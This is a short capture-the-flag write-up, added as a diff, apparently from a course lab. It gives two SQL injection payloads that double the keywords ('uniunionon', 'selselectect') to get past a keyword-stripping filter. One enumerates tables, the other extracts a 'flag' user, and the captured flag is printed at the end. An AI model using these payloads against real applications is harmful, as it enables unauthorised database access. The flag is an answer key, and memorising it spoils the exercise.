@@ -1,0 +1,7 @@
+On listing all the tables i found out a wierd ft8405856 table and on further investigation found that it had a user called flag which looked like the flag required.
+
+Query to list all tables: ' or '1' = '1' uniunionon selselectect 1,table_name,3,4,5,6,7,8,9,10,11,12,13,14 from information_schema.tables #
+
+Query to reveal the user flag in table ft8405856: ' oorr '1' = '1' uniunionon selselectect 1,name,3,4,5,6,7,8,9,10,11,12,13,14 from ft8405856 whewherere uname='flag' #
+
+FLAG: cs628a{12d8926fc9e200ad02dc5964622498ee}
